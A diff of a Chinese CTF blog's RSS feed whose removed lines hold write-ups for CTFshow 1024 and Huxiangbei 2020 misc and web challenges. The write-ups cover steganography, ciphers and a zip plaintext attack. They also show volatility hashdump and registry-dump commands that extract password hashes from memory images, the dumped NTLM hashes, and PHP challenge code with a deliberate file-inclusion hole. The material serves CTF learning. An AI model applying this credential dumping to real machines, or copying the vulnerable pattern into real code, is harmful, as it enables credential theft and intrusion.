-&lt;h2 id=&#34;1024_调频收音机&#34;&gt;1024_调频收音机&lt;/h2&gt;
-&lt;p&gt;频谱分析，01波形，没懂这个01波形怎么分析的，留着后续填坑。&lt;/p&gt;
-&lt;h2 id=&#34;1024_大威天龙&#34;&gt;1024_大威天龙&lt;/h2&gt;
-&lt;blockquote&gt;
-&lt;p&gt;题目描述：送你一句箴言“大威天龙，世尊地藏，般若诸佛，般若巴嘛哄”&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;谁能想到hint居然送答案。。。怪不得值50分。&lt;/p&gt;
-&lt;h3 id=&#34;第一关-1&#34;&gt;第一关&lt;/h3&gt;
-&lt;p&gt;&lt;a href=&#34;http://www.keyfc.net/bbs/tools/tudoucode.aspx&#34;&gt;与佛论禅&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;第二关-1&#34;&gt;第二关&lt;/h3&gt;
-&lt;p&gt;&lt;a href=&#34;http://hi.pcmoe.net/buddha.html&#34;&gt;新与佛论禅&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;第三关-1&#34;&gt;第三关&lt;/h3&gt;
-&lt;p&gt;&lt;a href=&#34;http://hi.pcmoe.net/index.html&#34;&gt;熊曰&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;第四关&#34;&gt;第四关&lt;/h3&gt;
-&lt;p&gt;&lt;a href=&#34;https://tools.takuron.top/talk-with-buddha/&#34;&gt;与佛论禅重制版V2&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;配合箴言&lt;code&gt;大威天龙，世尊地藏，般若诸佛，般若巴嘛哄&lt;/code&gt;解密得flag。&lt;/p&gt;
-&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
-&lt;p&gt;&lt;a href=&#34;https://lazzzaro.github.io/2020/10/25/match-CTFshow-1024%E6%9D%AF/&#34;&gt;CTFshow 1024杯&lt;/a&gt;&lt;/p&gt;
-</description>
-                
-                
-                
-                
-                
-                    
-                        
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/categories/ctf/">CTF</category>
-                                
-                            
-                        
-                    
-                        
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/ctfshow/">CTFshow</category>
-                                
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/php/">php</category>
-                                
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/python/">python</category>
-                                
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</category>
-                                
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/misc/">misc</category>
                                 
                             
                         
@@ -13164,311 +12602,6 @@ hint3：给你过滤的关键词又如何，[&#39;import&#39;, &#39;open&#39;, &
             </item>
         
             <item>
-                <title>湖湘杯2020Misc复现</title>
-                <link>https://tyskill.github.io/posts/hxb2020misc/</link>
-                <guid isPermaLink="true">https://tyskill.github.io/posts/hxb2020misc/</guid>
-                <pubDate>Mon, 02 Nov 2020 00:00:00 &#43;0000</pubDate>
-                
-                    <author>tyskill@foxmail.com (tyskill)</author>
-                
-                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
-                
-                    <description>&lt;h2 id=&#34;颜文字之谜&#34;&gt;颜文字之谜&lt;/h2&gt;
-&lt;p&gt;wireshark导出文件，打开index-demo.html，发现&lt;/p&gt;
-&lt;p&gt;base64隐写，脚本解密得到key值为&lt;code&gt;lorrie&lt;/code&gt;，有密钥那就肯定有加密：&lt;a href=&#34;http://www.darkside.com.au/snow/index.html&#34;&gt;snow&lt;/a&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;故事就是我把flag藏进颜文字里了(●&#39;◡&#39;●)❄❄❄❄❄❄&lt;/p&gt;
-&lt;p&gt;❄❄ ❄ ❄❄ ❄❄❄ ❄❄ ❄❄❄ ❄❄ ❄❄❄ ❄❄❄ ❄❄❄ ❄❄❄ ❄❄❄ ❄❄❄&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;这里的&lt;code&gt;❄&lt;/code&gt;提示了snow(看得出来个球)&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;snow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lorrie&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;index-demo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;解密得到&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;flag{→_→←_←←_←←_←←_← →_→→_→←_←←_←←_← →_→←_←←_←←_← ←_←←_←←_←→_→→_→ ←_←←_←←_←→_→→_→ ←_← ←_←←_←←_←→_→→_→ →_→→_→→_→→_→←_← →_→←_←←_←←_← ←_←←_←←_←←_←←_← ←_←→_→→_→→_→→_→ →_→→_→→_→→_→→_→ ←_←←_←←_←←_←←_← ←_←←_←→_→←_← →_→←_←←_←←_← ←_←←_←←_←←_←→_→ ←_←→_→ ←_←←_←→_→→_→→_→ →_→→_→→_→→_→←_← ←_←←_←←_←←_←←_← ←_←←_←←_←→_→→_→ ←_←→_→ →_→→_→→_→→_→→_→ →_→←_←→_→←_← ←_← →_→→_→←_←←_←←_← →_→→_→→_→→_→←_← →_→←_←→_→←_← ←_←←_←←_←→_→→_→ ←_←←_←←_←→_→→_→ →_→→_→←_←←_←←_← →_→→_→→_→←_←←_←}&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;code&gt;→_→ =&amp;gt; -&lt;/code&gt;、&lt;code&gt;←_← =&amp;gt; .&lt;/code&gt;转化，Morse解码即可。&lt;/p&gt;
-&lt;h2 id=&#34;passwd&#34;&gt;passwd&lt;/h2&gt;
-&lt;p&gt;&lt;a href=&#34;https://tyskill.github.io/Articles/hxb2020/&#34;&gt;湖湘杯2020挨打记录&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;虚实之间&#34;&gt;虚实之间&lt;/h2&gt;
-&lt;p&gt;      先binwalk分析一波，发现只分析出了&lt;code&gt;flag.txt&lt;/code&gt;和&lt;code&gt;mingwen.txt&lt;/code&gt;，而zip中明明还有&lt;code&gt;mingwen-副本.txt&lt;/code&gt;，说明此处隐藏了压缩包。&lt;/p&gt;
-&lt;p&gt;      这里不知道怎么回事，Windows和Linux的binwalk都试过了，foremost也试过了都无法分离出txt文件，分离出来的也是空的。&lt;/p&gt;
-&lt;p&gt;      然后使用010分析，发现副本txt文件头是单独于另外两个的，而且并没有加密，所以将其复制粘贴创建新zip文件。接着使用winrar修复损坏的副本zip，就可以成功打开txt文件。&lt;/p&gt;
-&lt;p&gt;有了明文，我们就可以进行明文攻击，我的AZPR版本正好是4.0，可惜版本对了，操作不对。&lt;/p&gt;
-&lt;p&gt;得到密码：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;123%asd!O&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;blockquote&gt;
-&lt;p&gt;注意：原zip和binwalk分离出来的zip虽然都能爆出密码，但只有binwalk分离出来的能成功解压(分离后需要winrar修复)&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;flag.txt内容：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;仅需5，跳过去&lt;br&gt;
-ffd5e341le25b2dcab15cbb}gc3bc5b{789b51&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;栅栏密码，在线网站解密即可。&lt;/p&gt;
-&lt;h2 id=&#34;隐藏的秘密&#34;&gt;隐藏的秘密&lt;/h2&gt;
-&lt;p&gt;前面的内容在&lt;strong&gt;挨打记录&lt;/strong&gt;里，下面只写如何出用户名密码。&lt;/p&gt;
-&lt;p&gt;导出注册表：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;volatility&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-f&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;secret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vmem&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-profile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Win2003SP1x86&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dumpregistry&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-dump-dir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=./&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hxb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;使用&lt;a href=&#34;https://www.mitec.cz/wrr.html&#34;&gt;windows registry recovery&lt;/a&gt;打开&lt;code&gt;registry.0xe1757860.SAM.reg&lt;/code&gt;文件，在&lt;code&gt;SAM-Group and User&lt;/code&gt;中对着每个用户查看登陆记录，只有&lt;code&gt;FHREhpe&lt;/code&gt;有过&lt;strong&gt;Last incorrect password&lt;/strong&gt;，查看一下他的密码：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;volatility&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-f&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;package&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Linux&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;secret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vmem&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-profile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Win2003SP1x86&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hashdump&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;findstr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FHREhpe&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;得到&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;FHREhpe$:1171:70fdb8f853bd427d7584248b8d2c9f9e:f3cf477fc3ea6ec0b3b5887616dd4506:::&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;md5解密得密码，flag=md5(FHREhpe$:NIAIWOMA)。&lt;/p&gt;
-&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
-&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/q851579181q/article/details/109454629&#34;&gt;2020湖湘杯MISC全解-writeup&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;http://www.pdsdt.lovepdsdt.com/index.php/2020/11/02/2020hxb-writeup/#-misc3&#34;&gt;2020湖湘杯部分Writeup&lt;/a&gt;&lt;/p&gt;
-</description>
-                
-                
-                
-                
-                
-                    
-                        
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/categories/ctf/">CTF</category>
-                                
-                            
-                        
-                    
-                        
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/misc/">misc</category>
-                                
-                            
-                        
-                    
-                
-            </item>
-        
-            <item>
-                <title>湖湘杯2020挨打记录</title>
-                <link>https://tyskill.github.io/posts/hxb2020/</link>
-                <guid isPermaLink="true">https://tyskill.github.io/posts/hxb2020/</guid>
-                <pubDate>Sun, 01 Nov 2020 00:00:00 &#43;0000</pubDate>
-                
-                    <author>tyskill@foxmail.com (tyskill)</author>
-                
-                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
-                
-                    <description>&lt;h1 id=&#34;web&#34;&gt;Web&lt;/h1&gt;
-&lt;h2 id=&#34;题目名字不重要反正题挺简单的&#34;&gt;题目名字不重要反正题挺简单的&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
-&lt;span class=&#34;nx&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-
-&lt;span class=&#34;c1&#34;&gt;//I heard you are good at PHPINFO+LFI, flag is in flag.php, find it my dear noob vegetable hacker.
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-    &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
-
-    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;phpinfo&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-        &lt;span class=&#34;nx&#34;&gt;phpinfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
-        &lt;span class=&#34;k&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-
-    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/proc/i&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-        &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;private&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-
-    &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/var/www/html/&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-    &lt;span class=&#34;nv&#34;&gt;$content&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-
-    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$content&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-        &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nothing&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-
-    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/script|&amp;lt;\?/i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-        &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;bypass me&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-
-    &lt;span class=&#34;k&#34;&gt;include_once&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-
-&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;一长串代码结果phpinfo里面就有flag，有flag了还做什么做啊😏&lt;/p&gt;
-&lt;h2 id=&#34;flagauthenticator&#34;&gt;flagauthenticator&lt;/h2&gt;
-&lt;blockquote&gt;
-&lt;p&gt;题目描述：我用flag作为key写了一个认证器，但是我怕它太危险于是放进了内网，并通过跳板机使用Chrome访问，听说该死的黑客会xss，我特意加了很多header。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;不会&lt;/p&gt;
-&lt;h2 id=&#34;有趣的game&#34;&gt;有趣的Game&lt;/h2&gt;
-&lt;p&gt;老非酋了。。。&lt;/p&gt;
-&lt;h1 id=&#34;misc&#34;&gt;Misc&lt;/h1&gt;
-&lt;h2 id=&#34;颜文字之谜&#34;&gt;颜文字之谜&lt;/h2&gt;
-&lt;p&gt;流量包导出文件，打开html发现base64隐写字符串，解码得&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;key:&amp;quot;lorrie&amp;quot;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;略。。&lt;/p&gt;
-&lt;h2 id=&#34;passwd&#34;&gt;passwd&lt;/h2&gt;
-&lt;p&gt;取证，使用工具：&lt;a href=&#34;https://github.com/volatilityfoundation/volatility&#34;&gt;volatility&lt;/a&gt;，使用方法：&lt;a href=&#34;https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/&#34;&gt;内存取证工具的挥发性&lt;/a&gt;。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;c&#34;&gt;# 获取信息&lt;/span&gt;
-&lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;volatility&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;imageinfo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-f&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;raw&lt;/span&gt;
-&lt;span class=&#34;c&#34;&gt;# flag是sha1(password)，直接找密码哈希&lt;/span&gt;
-&lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;volatility&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hashdump&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-f&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;raw&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-profile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Win7SP1x86&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;获得&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;br&gt;
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;br&gt;
-CTF:1000:aad3b435b51404eeaad3b435b51404ee:0a640404b5c386ab12092587fe19cd02:::&lt;/p&gt;
-&lt;/blockquote&gt;
